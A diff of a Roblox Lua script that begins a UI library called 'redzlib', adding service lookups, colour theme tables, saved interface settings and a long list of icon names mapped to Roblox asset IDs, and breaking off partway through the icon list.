@@ -1,8015 +1,5203 @@
-if not game:IsLoaded() then
-    game.Loaded:Wait()
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerMouse = Player:GetMouse()
+
+local redzlib = {
+	Themes = {
+		Darker = {
+			["Color Hub 1"] = ColorSequence.new({
+				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 15, 5)),
+				ColorSequenceKeypoint.new(0.50, Color3.fromRGB(12, 28, 12)),
+				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 15, 5))
+			}),
+			["Color Hub 2"] = Color3.fromRGB(8, 22, 8),
+			["Color Stroke"] = Color3.fromRGB(15, 35, 15),
+			["Color Theme"] = Color3.fromRGB(0, 200, 60),
+			["Color Text"] = Color3.fromRGB(243, 243, 243),
+			["Color Dark Text"] = Color3.fromRGB(180, 180, 180)
+		},
+		Dark = {
+			["Color Hub 1"] = ColorSequence.new({
+				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(15, 35, 15)),
+				ColorSequenceKeypoint.new(0.50, Color3.fromRGB(18, 40, 18)),
+				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(15, 35, 15))
+			}),
+			["Color Hub 2"] = Color3.fromRGB(12, 30, 12),
+			
+			["Color Stroke"] = Color3.fromRGB(20, 50, 20),
+			["Color Theme"] = Color3.fromRGB(0, 200, 60),
+			["Color Text"] = Color3.fromRGB(245, 245, 245),
+			["Color Dark Text"] = Color3.fromRGB(190, 190, 190)
+		},
+		Purple = {
+			["Color Hub 1"] = ColorSequence.new({
+				ColorSequenceKeypoint.new(0.00, Color3.fromRGB(5, 15, 5)),
+				ColorSequenceKeypoint.new(0.50, Color3.fromRGB(12, 28, 12)),
+				ColorSequenceKeypoint.new(1.00, Color3.fromRGB(5, 15, 5))
+			}),
+			["Color Hub 2"] = Color3.fromRGB(8, 22, 8),
+			["Color Stroke"] = Color3.fromRGB(15, 35, 15),
+			["Color Theme"] = Color3.fromRGB(0, 200, 60),
+			["Color Text"] = Color3.fromRGB(240, 240, 240),
+			["Color Dark Text"] = Color3.fromRGB(180, 180, 180),
+			["Color Dark Purple"] = Color3.fromRGB(179, 0, 255),
+			["Color Hub 9"] = Color3.fromRGB(0, 0, 0, 0),
+			["Color Dark Greem"] = Color3.fromRGB(43, 255, 0)
+		}
+	},
+	Info = {
+		Version = "1.2.0"
+	},
+	Save = {
+		UISize = {550, 380},
+		TabSize = 160,
+		Theme = "Purple"
+	},
+	Settings = {},
+	Connection = {},
+	Instances = {},
+	Elements = {},
+	Options = {},
+	Flags = {},
+	Tabs = {},
+	Icons = (function()
+		return {
+			["accessibility"] = "rbxassetid://10709751939",
+			["activity"] = "rbxassetid://10709752035",
+			["airvent"] = "rbxassetid://10709752131",
+			["airplay"] = "rbxassetid://10709752254",
+			["alarmcheck"] = "rbxassetid://10709752405",
+			["alarmclock"] = "rbxassetid://10709752630",
+			["alarmclockoff"] = "rbxassetid://10709752508",
+			["alarmminus"] = "rbxassetid://10709752732",
+			["alarmplus"] = "rbxassetid://10709752825",
+			["album"] = "rbxassetid://10709752906",
+			["alertcircle"] = "rbxassetid://10709752996",
+			["alertoctagon"] = "rbxassetid://10709753064",
+			["alerttriangle"] = "rbxassetid://10709753149",
+			["aligncenter"] = "rbxassetid://10709753570",
+			["aligncenterhorizontal"] = "rbxassetid://10709753272",
+			["aligncentervertical"] = "rbxassetid://10709753421",
+			["alignendhorizontal"] = "rbxassetid://10709753692",
+			["alignendvertical"] = "rbxassetid://10709753808",
+			["alignhorizontaldistributecenter"] = "rbxassetid://10747779791",
+			["alignhorizontaldistributeend"] = "rbxassetid://10747784534",
+			["alignhorizontaldistributestart"] = "rbxassetid://10709754118",
+			["alignhorizontaljustifycenter"] = "rbxassetid://10709754204",
+			["alignhorizontaljustifyend"] = "rbxassetid://10709754317",
+			["alignhorizontaljustifystart"] = "rbxassetid://10709754436",
+			["alignhorizontalspacearound"] = "rbxassetid://10709754590",
+			["alignhorizontalspacebetween"] = "rbxassetid://10709754749",
+			["alignjustify"] = "rbxassetid://10709759610",
+			["alignleft"] = "rbxassetid://10709759764",
+			["alignright"] = "rbxassetid://10709759895",
+			["alignstarthorizontal"] = "rbxassetid://10709760051",
+			["alignstartvertical"] = "rbxassetid://10709760244",
+			["alignverticaldistributecenter"] = "rbxassetid://10709760351",
+			["alignverticaldistributeend"] = "rbxassetid://10709760434",
+			["alignverticaldistributestart"] = "rbxassetid://10709760612",
+			["alignverticaljustifycenter"] = "rbxassetid://10709760814",
+			["alignverticaljustifyend"] = "rbxassetid://10709761003",
+			["alignverticaljustifystart"] = "rbxassetid://10709761176",
+			["alignverticalspacearound"] = "rbxassetid://10709761324",
+			["alignverticalspacebetween"] = "rbxassetid://10709761434",
+			["anchor"] = "rbxassetid://10709761530",
+			["angry"] = "rbxassetid://10709761629",
+			["annoyed"] = "rbxassetid://10709761722",
+			["aperture"] = "rbxassetid://10709761813",
+			["apple"] = "rbxassetid://10709761889",
+			["archive"] = "rbxassetid://10709762233",
+			["archiverestore"] = "rbxassetid://10709762058",
+			["armchair"] = "rbxassetid://10709762327",
+			["arrowbigdown"] = "rbxassetid://10747796644",
+			["arrowbigleft"] = "rbxassetid://10709762574",
+			["arrowbigright"] = "rbxassetid://10709762727",
+			["arrowbigup"] = "rbxassetid://10709762879",
+			["arrowdown"] = "rbxassetid://10709767827",
+			["arrowdowncircle"] = "rbxassetid://10709763034",
+			["arrowdownleft"] = "rbxassetid://10709767656",
+			["arrowdownright"] = "rbxassetid://10709767750",
+			["arrowleft"] = "rbxassetid://10709768114",
+			["arrowleftcircle"] = "rbxassetid://10709767936",
+			["arrowleftright"] = "rbxassetid://10709768019",
+			["arrowright"] = "rbxassetid://10709768347",
+			["arrowrightcircle"] = "rbxassetid://10709768226",
+			["arrowup"] = "rbxassetid://10709768939",
+			["arrowupcircle"] = "rbxassetid://10709768432",
+			["arrowupdown"] = "rbxassetid://10709768538",
+			["arrowupleft"] = "rbxassetid://10709768661",
+			["arrowupright"] = "rbxassetid://10709768787",
+			["asterisk"] = "rbxassetid://10709769095",
+			["atsign"] = "rbxassetid://10709769286",
+			["award"] = "rbxassetid://10709769406",
+			["axe"] = "rbxassetid://10709769508",
+			["axis3d"] = "rbxassetid://10709769598",
+			["baby"] = "rbxassetid://10709769732",
+			["backpack"] = "rbxassetid://10709769841",
+			["baggageclaim"] = "rbxassetid://10709769935",
+			["banana"] = "rbxassetid://10709770005",
+			["banknote"] = "rbxassetid://10709770178",
+			["barchart"] = "rbxassetid://10709773755",
+			["barchart2"] = "rbxassetid://10709770317",
+			["barchart3"] = "rbxassetid://10709770431",
+			["barchart4"] = "rbxassetid://10709770560",
+			["barcharthorizontal"] = "rbxassetid://10709773669",
+			["barcode"] = "rbxassetid://10747360675",
+			["baseline"] = "rbxassetid://10709773863",
+			["bath"] = "rbxassetid://10709773963",
+			["battery"] = "rbxassetid://10709774640",
+			["batterycharging"] = "rbxassetid://10709774068",
+			["batteryfull"] = "rbxassetid://10709774206",
+			["batterylow"] = "rbxassetid://10709774370",
+			["batterymedium"] = "rbxassetid://10709774513",
+			["beaker"] = "rbxassetid://10709774756",
+			["bed"] = "rbxassetid://10709775036",
+			["beddouble"] = "rbxassetid://10709774864",
+			["bedsingle"] = "rbxassetid://10709774968",
+			["beer"] = "rbxassetid://10709775167",
+			["bell"] = "rbxassetid://10709775704",
+			["bellminus"] = "rbxassetid://10709775241",
+			["belloff"] = "rbxassetid://10709775320",
+			["bellplus"] = "rbxassetid://10709775448",
+			["bellring"] = "rbxassetid://10709775560",
+			["bike"] = "rbxassetid://10709775894",
+			["binary"] = "rbxassetid://10709776050",
+			["bitcoin"] = "rbxassetid://10709776126",
+			["bluetooth"] = "rbxassetid://10709776655",
+			["bluetoothconnected"] = "rbxassetid://10709776240",
+			["bluetoothoff"] = "rbxassetid://10709776344",
+			["bluetoothsearching"] = "rbxassetid://10709776501",
+			["bold"] = "rbxassetid://10747813908",
+			["bomb"] = "rbxassetid://10709781460",
+			["bone"] = "rbxassetid://10709781605",
+			["book"] = "rbxassetid://10709781824",
+			["bookopen"] = "rbxassetid://10709781717",
+			["bookmark"] = "rbxassetid://10709782154",
+			["bookmarkminus"] = "rbxassetid://10709781919",
+			["bookmarkplus"] = "rbxassetid://10709782044",
+			["bot"] = "rbxassetid://10709782230",
+			["box"] = "rbxassetid://10709782497",
+			["boxselect"] = "rbxassetid://10709782342",
+			["boxes"] = "rbxassetid://10709782582",
+			["briefcase"] = "rbxassetid://10709782662",
+			["brush"] = "rbxassetid://10709782758",
+			["bug"] = "rbxassetid://10709782845",
+			["building"] = "rbxassetid://10709783051",
+			["building2"] = "rbxassetid://10709782939",
+			["bus"] = "rbxassetid://10709783137",
+			["cake"] = "rbxassetid://10709783217",
+			["calculator"] = "rbxassetid://10709783311",
+			["calendar"] = "rbxassetid://10709789505",
+			["calendarcheck"] = "rbxassetid://10709783474",
+			["calendarcheck2"] = "rbxassetid://10709783392",
+			["calendarclock"] = "rbxassetid://10709783577",
+			["calendardays"] = "rbxassetid://10709783673",
+			["calendarheart"] = "rbxassetid://10709783835",
+			["calendarminus"] = "rbxassetid://10709783959",
+			["calendaroff"] = "rbxassetid://10709788784",
+			["calendarplus"] = "rbxassetid://10709788937",
+			["calendarrange"] = "rbxassetid://10709789053",
+			["calendarsearch"] = "rbxassetid://10709789200",
+			["calendarx"] = "rbxassetid://10709789407",
+			["calendarx2"] = "rbxassetid://10709789329",
+			["camera"] = "rbxassetid://10709789686",
+			["cameraoff"] = "rbxassetid://10747822677",
+			["car"] = "rbxassetid://10709789810",
+			["carrot"] = "rbxassetid://10709789960",
+			["cast"] = "rbxassetid://10709790097",
+			["charge"] = "rbxassetid://10709790202",
+			["check"] = "rbxassetid://10709790644",
+			["checkcircle"] = "rbxassetid://10709790387",
+			["checkcircle2"] = "rbxassetid://10709790298",
+			["checksquare"] = "rbxassetid://10709790537",
+			["chefhat"] = "rbxassetid://10709790757",
+			["cherry"] = "rbxassetid://10709790875",
+			["chevrondown"] = "rbxassetid://10709790948",
+			["chevronfirst"] = "rbxassetid://10709791015",
+			["chevronlast"] = "rbxassetid://10709791130",
+			["chevronleft"] = "rbxassetid://10709791281",
+			["chevronright"] = "rbxassetid://10709791437",
+			["chevronup"] = "rbxassetid://10709791523",
+			["chevronsdown"] = "rbxassetid://10709796864",
+			["chevronsdownup"] = "rbxassetid://10709791632",
+			["chevronsleft"] = "rbxassetid://10709797151",
+			["chevronsleftright"] = "rbxassetid://10709797006",
+			["chevronsright"] = "rbxassetid://10709797382",
+			["chevronsrightleft"] = "rbxassetid://10709797274",
+			["chevronsup"] = "rbxassetid://10709797622",
+			["chevronsupdown"] = "rbxassetid://10709797508",
+			["chrome"] = "rbxassetid://10709797725",
+			["circle"] = "rbxassetid://10709798174",
+			["circledot"] = "rbxassetid://10709797837",
+			["circleellipsis"] = "rbxassetid://10709797985",
+			["circleslashed"] = "rbxassetid://10709798100",
+			["citrus"] = "rbxassetid://10709798276",
+			["clapperboard"] = "rbxassetid://10709798350",
+			["clipboard"] = "rbxassetid://10709799288",
+			["clipboardcheck"] = "rbxassetid://10709798443",
+			["clipboardcopy"] = "rbxassetid://10709798574",
+			["clipboardedit"] = "rbxassetid://10709798682",
+			["clipboardlist"] = "rbxassetid://10709798792",
+			["clipboardsignature"] = "rbxassetid://10709798890",
+			["clipboardtype"] = "rbxassetid://10709798999",
+			["clipboardx"] = "rbxassetid://10709799124",
+			["clock"] = "rbxassetid://10709805144",
+			["clock1"] = "rbxassetid://10709799535",
+			["clock10"] = "rbxassetid://10709799718",
+			["clock11"] = "rbxassetid://10709799818",
+			["clock12"] = "rbxassetid://10709799962",
+			["clock2"] = "rbxassetid://10709803876",
+			["clock3"] = "rbxassetid://10709803989",
+			["clock4"] = "rbxassetid://10709804164",
+			["clock5"] = "rbxassetid://10709804291",
+			["clock6"] = "rbxassetid://10709804435",
+			["clock7"] = "rbxassetid://10709804599",
+			["clock8"] = "rbxassetid://10709804784",
+			["clock9"] = "rbxassetid://10709804996",
+			["cloud"] = "rbxassetid://10709806740",
+			["cloudcog"] = "rbxassetid://10709805262",
+			["clouddrizzle"] = "rbxassetid://10709805371",
+			["cloudfog"] = "rbxassetid://10709805477",
+			["cloudhail"] = "rbxassetid://10709805596",
+			["cloudlightning"] = "rbxassetid://10709805727",
+			["cloudmoon"] = "rbxassetid://10709805942",
+			["cloudmoonrain"] = "rbxassetid://10709805838",
+			["cloudoff"] = "rbxassetid://10709806060",
+			["cloudrain"] = "rbxassetid://10709806277",
+			["cloudrainwind"] = "rbxassetid://10709806166",
+			["cloudsnow"] = "rbxassetid://10709806374",
+			["cloudsun"] = "rbxassetid://10709806631",
+			["cloudsunrain"] = "rbxassetid://10709806475",
+			["cloudy"] = "rbxassetid://10709806859",
+			["clover"] = "rbxassetid://10709806995",
+			["code"] = "rbxassetid://10709810463",
+			["code2"] = "rbxassetid://10709807111",
+			["codepen"] = "rbxassetid://10709810534",
+			["codesandbox"] = "rbxassetid://10709810676",
+			["coffee"] = "rbxassetid://10709810814",
+			["cog"] = "rbxassetid://10709810948",
+			["coins"] = "rbxassetid://10709811110",
+			["columns"] = "rbxassetid://10709811261",
+			["command"] = "rbxassetid://10709811365",
+			["compass"] = "rbxassetid://10709811445",
+			["component"] = "rbxassetid://10709811595",
+			["conciergebell"] = "rbxassetid://10709811706",
+			["connection"] = "rbxassetid://10747361219",
+			["contact"] = "rbxassetid://10709811834",
+			["contrast"] = "rbxassetid://10709811939",
+			["cookie"] = "rbxassetid://10709812067",
+			["copy"] = "rbxassetid://10709812159",
+			["copyleft"] = "rbxassetid://10709812251",
+			["copyright"] = "rbxassetid://10709812311",
+			["cornerdownleft"] = "rbxassetid://10709812396",
+			["cornerdownright"] = "rbxassetid://10709812485",
+			["cornerleftdown"] = "rbxassetid://10709812632",
+			["cornerleftup"] = "rbxassetid://10709812784",
+			["cornerrightdown"] = "rbxassetid://10709812939",
+			["cornerrightup"] = "rbxassetid://10709813094",
+			["cornerupleft"] = "rbxassetid://10709813185",
+			["cornerupright"] = "rbxassetid://10709813281",
+			["cpu"] = "rbxassetid://10709813383",
+			["croissant"] = "rbxassetid://10709818125",
+			["crop"] = "rbxassetid://10709818245",
+			["cross"] = "rbxassetid://10709818399",
+			["crosshair"] = "rbxassetid://10709818534",
+			["crown"] = "rbxassetid://10709818626",
+			["cupsoda"] = "rbxassetid://10709818763",
+			["curlybraces"] = "rbxassetid://10709818847",
+			["currency"] = "rbxassetid://10709818931",
+			["database"] = "rbxassetid://10709818996",
+			["delete"] = "rbxassetid://10709819059",
+			["diamond"] = "rbxassetid://10709819149",
+			["dice1"] = "rbxassetid://10709819266",
+			["dice2"] = "rbxassetid://10709819361",
+			["dice3"] = "rbxassetid://10709819508",
+			["dice4"] = "rbxassetid://10709819670",
+			["dice5"] = "rbxassetid://10709819801",
+			["dice6"] = "rbxassetid://10709819896",
+			["dices"] = "rbxassetid://10723343321",
+			["diff"] = "rbxassetid://10723343416",
+			["disc"] = "rbxassetid://10723343537",
+			["divide"] = "rbxassetid://10723343805",
+			["dividecircle"] = "rbxassetid://10723343636",
+			["dividesquare"] = "rbxassetid://10723343737",
+			["dollarsign"] = "rbxassetid://10723343958",
+			["download"] = "rbxassetid://10723344270",
+			["downloadcloud"] = "rbxassetid://10723344088",
+			["droplet"] = "rbxassetid://10723344432",
+			["droplets"] = "rbxassetid://10734883356",
+			["drumstick"] = "rbxassetid://10723344737",
+			["edit"] = "rbxassetid://10734883598",
+			["edit2"] = "rbxassetid://10723344885",
+			["edit3"] = "rbxassetid://10723345088",
+			["egg"] = "rbxassetid://10723345518",
+			["eggfried"] = "rbxassetid://10723345347",
+			["electricity"] = "rbxassetid://10723345749",
+			["electricityoff"] = "rbxassetid://10723345643",
+			["equal"] = "rbxassetid://10723345990",
+			["equalnot"] = "rbxassetid://10723345866",
+			["eraser"] = "rbxassetid://10723346158",
+			["euro"] = "rbxassetid://10723346372",
+			["expand"] = "rbxassetid://10723346553",
+			["externallink"] = "rbxassetid://10723346684",
+			["eye"] = "rbxassetid://10723346959",
+			["eyeoff"] = "rbxassetid://10723346871",
+			["factory"] = "rbxassetid://10723347051",
+			["fan"] = "rbxassetid://10723354359",
+			["fastforward"] = "rbxassetid://10723354521",
+			["feather"] = "rbxassetid://10723354671",
+			["figma"] = "rbxassetid://10723354801",
+			["file"] = "rbxassetid://10723374641",
+			["filearchive"] = "rbxassetid://10723354921",
+			["fileaudio"] = "rbxassetid://10723355148",
+			["fileaudio2"] = "rbxassetid://10723355026",
+			["fileaxis3d"] = "rbxassetid://10723355272",
+			["filebadge"] = "rbxassetid://10723355622",
+			["filebadge2"] = "rbxassetid://10723355451",
+			["filebarchart"] = "rbxassetid://10723355887",
+			["filebarchart2"] = "rbxassetid://10723355746",
+			["filebox"] = "rbxassetid://10723355989",
+			["filecheck"] = "rbxassetid://10723356210",
+			["filecheck2"] = "rbxassetid://10723356100",
+			["fileclock"] = "rbxassetid://10723356329",
+			["filecode"] = "rbxassetid://10723356507",
+			["filecog"] = "rbxassetid://10723356830",
+			["filecog2"] = "rbxassetid://10723356676",
+			["filediff"] = "rbxassetid://10723357039",
+			["filedigit"] = "rbxassetid://10723357151",
+			["filedown"] = "rbxassetid://10723357322",
+			["fileedit"] = "rbxassetid://10723357495",
+			["fileheart"] = "rbxassetid://10723357637",
+			["fileimage"] = "rbxassetid://10723357790",
+			["fileinput"] = "rbxassetid://10723357933",
+			["filejson"] = "rbxassetid://10723364435",
+			["filejson2"] = "rbxassetid://10723364361",
+			["filekey"] = "rbxassetid://10723364605",
+			["filekey2"] = "rbxassetid://10723364515",
+			["filelinechart"] = "rbxassetid://10723364725",
+			["filelock"] = "rbxassetid://10723364957",
+			["filelock2"] = "rbxassetid://10723364861",
+			["fileminus"] = "rbxassetid://10723365254",
+			["fileminus2"] = "rbxassetid://10723365086",
+			["fileoutput"] = "rbxassetid://10723365457",
+			["filepiechart"] = "rbxassetid://10723365598",
+			["fileplus"] = "rbxassetid://10723365877",
+			["fileplus2"] = "rbxassetid://10723365766",
+			["filequestion"] = "rbxassetid://10723365987",
+			["filescan"] = "rbxassetid://10723366167",
+			["filesearch"] = "rbxassetid://10723366550",
+			["filesearch2"] = "rbxassetid://10723366340",
+			["filesignature"] = "rbxassetid://10723366741",
+			["filespreadsheet"] = "rbxassetid://10723366962",
+			["filesymlink"] = "rbxassetid://10723367098",
+			["fileterminal"] = "rbxassetid://10723367244",
+			["filetext"] = "rbxassetid://10723367380",
+			["filetype"] = "rbxassetid://10723367606",
+			["filetype2"] = "rbxassetid://10723367509",
+			["fileup"] = "rbxassetid://10723367734",
+			["filevideo"] = "rbxassetid://10723373884",
+			["filevideo2"] = "rbxassetid://10723367834",
+			["filevolume"] = "rbxassetid://10723374172",
+			["filevolume2"] = "rbxassetid://10723374030",
+			["filewarning"] = "rbxassetid://10723374276",
+			["filex"] = "rbxassetid://10723374544",
+			["filex2"] = "rbxassetid://10723374378",
+			["files"] = "rbxassetid://10723374759",
+			["film"] = "rbxassetid://10723374981",
+			["filter"] = "rbxassetid://10723375128",
+			["fingerprint"] = "rbxassetid://10723375250",
+			["flag"] = "rbxassetid://10723375890",
+			["flagoff"] = "rbxassetid://10723375443",
+			["flagtriangleleft"] = "rbxassetid://10723375608",
+			["flagtriangleright"] = "rbxassetid://10723375727",
+			["flame"] = "rbxassetid://10723376114",
+			["flashlight"] = "rbxassetid://10723376471",
+			["flashlightoff"] = "rbxassetid://10723376365",
+			["flaskconical"] = "rbxassetid://10734883986",
+			["flaskround"] = "rbxassetid://10723376614",
+			["fliphorizontal"] = "rbxassetid://10723376884",
+			["fliphorizontal2"] = "rbxassetid://10723376745",
+			["flipvertical"] = "rbxassetid://10723377138",
+			["flipvertical2"] = "rbxassetid://10723377026",
+			["flower"] = "rbxassetid://10747830374",
+			["flower2"] = "rbxassetid://10723377305",
+			["focus"] = "rbxassetid://10723377537",
+			["folder"] = "rbxassetid://10723387563",
+			["folderarchive"] = "rbxassetid://10723384478",
+			["foldercheck"] = "rbxassetid://10723384605",
+			["folderclock"] = "rbxassetid://10723384731",
+			["folderclosed"] = "rbxassetid://10723384893",
+			["foldercog"] = "rbxassetid://10723385213",
+			["foldercog2"] = "rbxassetid://10723385036",
+			["folderdown"] = "rbxassetid://10723385338",
+			["folderedit"] = "rbxassetid://10723385445",
+			["folderheart"] = "rbxassetid://10723385545",
+			["folderinput"] = "rbxassetid://10723385721",
+			["folderkey"] = "rbxassetid://10723385848",
+			["folderlock"] = "rbxassetid://10723386005",
+			["folderminus"] = "rbxassetid://10723386127",
+			["folderopen"] = "rbxassetid://10723386277",
+			["folderoutput"] = "rbxassetid://10723386386",
+			["folderplus"] = "rbxassetid://10723386531",
+			["foldersearch"] = "rbxassetid://10723386787",
+			["foldersearch2"] = "rbxassetid://10723386674",
+			["foldersymlink"] = "rbxassetid://10723386930",
+			["foldertree"] = "rbxassetid://10723387085",
+			["folderup"] = "rbxassetid://10723387265",
+			["folderx"] = "rbxassetid://10723387448",
+			["folders"] = "rbxassetid://10723387721",
+			["forminput"] = "rbxassetid://10723387841",
+			["forward"] = "rbxassetid://10723388016",
+			["frame"] = "rbxassetid://10723394389",
+			["framer"] = "rbxassetid://10723394565",
+			["frown"] = "rbxassetid://10723394681",
+			["fuel"] = "rbxassetid://10723394846",
+			["functionsquare"] = "rbxassetid://10723395041",
+			["gamepad"] = "rbxassetid://10723395457",
+			["gamepad2"] = "rbxassetid://10723395215",
+			["gauge"] = "rbxassetid://10723395708",
+			["gavel"] = "rbxassetid://10723395896",
+			["gem"] = "rbxassetid://10723396000",
+			["ghost"] = "rbxassetid://10723396107",
+			["gift"] = "rbxassetid://10723396402",
+			["giftcard"] = "rbxassetid://10723396225",
+			["gitbranch"] = "rbxassetid://10723396676",
+			["gitbranchplus"] = "rbxassetid://10723396542",
+			["gitcommit"] = "rbxassetid://10723396812",
+			["gitcompare"] = "rbxassetid://10723396954",
+			["gitfork"] = "rbxassetid://10723397049",
+			["gitmerge"] = "rbxassetid://10723397165",
+			["gitpullrequest"] = "rbxassetid://10723397431",
+			["gitpullrequestclosed"] = "rbxassetid://10723397268",
+			["gitpullrequestdraft"] = "rbxassetid://10734884302",
+			["glass"] = "rbxassetid://10723397788",
+			["glass2"] = "rbxassetid://10723397529",
+			["glasswater"] = "rbxassetid://10723397678",
+			["glasses"] = "rbxassetid://10723397895",
+			["globe"] = "rbxassetid://10723404337",
+			["globe2"] = "rbxassetid://10723398002",
+			["grab"] = "rbxassetid://10723404472",
+			["graduationcap"] = "rbxassetid://10723404691",
+			["grape"] = "rbxassetid://10723404822",
+			["grid"] = "rbxassetid://10723404936",
+			["griphorizontal"] = "rbxassetid://10723405089",
+			["gripvertical"] = "rbxassetid://10723405236",
+			["hammer"] = "rbxassetid://10723405360",
+			["hand"] = "rbxassetid://10723405649",
+			["handmetal"] = "rbxassetid://10723405508",
+			["harddrive"] = "rbxassetid://10723405749",
+			["hardhat"] = "rbxassetid://10723405859",
+			["hash"] = "rbxassetid://10723405975",
+			["haze"] = "rbxassetid://10723406078",
+			["headphones"] = "rbxassetid://10723406165",
+			["heart"] = "rbxassetid://10723406885",
+			["heartcrack"] = "rbxassetid://10723406299",
+			["hearthandshake"] = "rbxassetid://10723406480",
+			["heartoff"] = "rbxassetid://10723406662",
+			["heartpulse"] = "rbxassetid://10723406795",
+			["helpcircle"] = "rbxassetid://10723406988",
+			["hexagon"] = "rbxassetid://10723407092",
+			["highlighter"] = "rbxassetid://10723407192",
+			["history"] = "rbxassetid://10723407335",
+			["home"] = "rbxassetid://10723407389",
+			["hourglass"] = "rbxassetid://10723407498",
+			["icecream"] = "rbxassetid://10723414308",
+			["image"] = "rbxassetid://10723415040",
+			["imageminus"] = "rbxassetid://10723414487",
+			["imageoff"] = "rbxassetid://10723414677",
+			["imageplus"] = "rbxassetid://10723414827",
+			["import"] = "rbxassetid://10723415205",
+			["inbox"] = "rbxassetid://10723415335",
+			["indent"] = "rbxassetid://10723415494",
+			["indianrupee"] = "rbxassetid://10723415642",
+			["infinity"] = "rbxassetid://10723415766",
+			["info"] = "rbxassetid://10723415903",
+			["inspect"] = "rbxassetid://10723416057",
+			["italic"] = "rbxassetid://10723416195",
+			["japaneseyen"] = "rbxassetid://10723416363",
+			["joystick"] = "rbxassetid://10723416527",
+			["key"] = "rbxassetid://10723416652",
+			["keyboard"] = "rbxassetid://10723416765",
+			["lamp"] = "rbxassetid://10723417513",
+			["lampceiling"] = "rbxassetid://10723416922",
+			["lampdesk"] = "rbxassetid://10723417016",
+			["lampfloor"] = "rbxassetid://10723417131",
+			["lampwalldown"] = "rbxassetid://10723417240",
+			["lampwallup"] = "rbxassetid://10723417356",
+			["landmark"] = "rbxassetid://10723417608",
+			["languages"] = "rbxassetid://10723417703",
+			["laptop"] = "rbxassetid://10723423881",
+			["laptop2"] = "rbxassetid://10723417797",
+			["lasso"] = "rbxassetid://10723424235",
+			["lassoselect"] = "rbxassetid://10723424058",
+			["laugh"] = "rbxassetid://10723424372",
+			["layers"] = "rbxassetid://10723424505",
+			["layout"] = "rbxassetid://10723425376",
+			["layoutdashboard"] = "rbxassetid://10723424646",
+			["layoutgrid"] = "rbxassetid://10723424838",
+			["layoutlist"] = "rbxassetid://10723424963",
+			["layouttemplate"] = "rbxassetid://10723425187",
+			["leaf"] = "rbxassetid://10723425539",
+			["library"] = "rbxassetid://10723425615",
+			["lifebuoy"] = "rbxassetid://10723425685",
+			["lightbulb"] = "rbxassetid://10723425852",
+			["lightbulboff"] = "rbxassetid://10723425762",
+			["linechart"] = "rbxassetid://10723426393",
+			["link"] = "rbxassetid://10723426722",
+			["link2"] = "rbxassetid://10723426595",
+			["link2off"] = "rbxassetid://10723426513",
+			["list"] = "rbxassetid://10723433811",
+			["listchecks"] = "rbxassetid://10734884548",
+			["listend"] = "rbxassetid://10723426886",
+			["listminus"] = "rbxassetid://10723426986",
+			["listmusic"] = "rbxassetid://10723427081",
+			["listordered"] = "rbxassetid://10723427199",
+			["listplus"] = "rbxassetid://10723427334",
+			["liststart"] = "rbxassetid://10723427494",
+			["listvideo"] = "rbxassetid://10723427619",
+			["listx"] = "rbxassetid://10723433655",
+			["loader"] = "rbxassetid://10723434070",
+			["loader2"] = "rbxassetid://10723433935",
+			["locate"] = "rbxassetid://10723434557",
+			["locatefixed"] = "rbxassetid://10723434236",
+			["locateoff"] = "rbxassetid://10723434379",
+			["lock"] = "rbxassetid://10723434711",
+			["login"] = "rbxassetid://10723434830",
+			["logout"] = "rbxassetid://10723434906",
+			["luggage"] = "rbxassetid://10723434993",
+			["magnet"] = "rbxassetid://10723435069",
+			["mail"] = "rbxassetid://10734885430",
+			["mailcheck"] = "rbxassetid://10723435182",
+			["mailminus"] = "rbxassetid://10723435261",
+			["mailopen"] = "rbxassetid://10723435342",
+			["mailplus"] = "rbxassetid://10723435443",
+			["mailquestion"] = "rbxassetid://10723435515",
+			["mailsearch"] = "rbxassetid://10734884739",
+			["mailwarning"] = "rbxassetid://10734885015",
+			["mailx"] = "rbxassetid://10734885247",
+			["mails"] = "rbxassetid://10734885614",
+			["map"] = "rbxassetid://10734886202",
+			["mappin"] = "rbxassetid://10734886004",
+			["mappinoff"] = "rbxassetid://10734885803",
+			["maximize"] = "rbxassetid://10734886735",
+			["maximize2"] = "rbxassetid://10734886496",
+			["medal"] = "rbxassetid://10734887072",
+			["megaphone"] = "rbxassetid://10734887454",
+			["megaphoneoff"] = "rbxassetid://10734887311",
+			["meh"] = "rbxassetid://10734887603",
+			["menu"] = "rbxassetid://10734887784",
+			["messagecircle"] = "rbxassetid://10734888000",
+			["messagesquare"] = "rbxassetid://10734888228",
+			["mic"] = "rbxassetid://10734888864",
+			["mic2"] = "rbxassetid://10734888430",
+			["micoff"] = "rbxassetid://10734888646",
+			["microscope"] = "rbxassetid://10734889106",
+			["microwave"] = "rbxassetid://10734895076",
+			["milestone"] = "rbxassetid://10734895310",
+			["minimize"] = "rbxassetid://10734895698",
+			["minimize2"] = "rbxassetid://10734895530",
+			["minus"] = "rbxassetid://10734896206",
+			["minuscircle"] = "rbxassetid://10734895856",
+			["minussquare"] = "rbxassetid://10734896029",
+			["monitor"] = "rbxassetid://10734896881",
+			["monitoroff"] = "rbxassetid://10734896360",
+			["monitorspeaker"] = "rbxassetid://10734896512",
+			["moon"] = "rbxassetid://10734897102",
+			["morehorizontal"] = "rbxassetid://10734897250",
+			["morevertical"] = "rbxassetid://10734897387",
+			["mountain"] = "rbxassetid://10734897956",
+			["mountainsnow"] = "rbxassetid://10734897665",
+			["mouse"] = "rbxassetid://10734898592",
+			["mousepointer"] = "rbxassetid://10734898476",
+			["mousepointer2"] = "rbxassetid://10734898194",
+			["mousepointerclick"] = "rbxassetid://10734898355",
+			["move"] = "rbxassetid://10734900011",
+			["move3d"] = "rbxassetid://10734898756",
+			["movediagonal"] = "rbxassetid://10734899164",
+			["movediagonal2"] = "rbxassetid://10734898934",
+			["movehorizontal"] = "rbxassetid://10734899414",
+			["movevertical"] = "rbxassetid://10734899821",
+			["music"] = "rbxassetid://10734905958",
+			["music2"] = "rbxassetid://10734900215",
+			["music3"] = "rbxassetid://10734905665",
+			["music4"] = "rbxassetid://10734905823",
+			["navigation"] = "rbxassetid://10734906744",
+			["navigation2"] = "rbxassetid://10734906332",
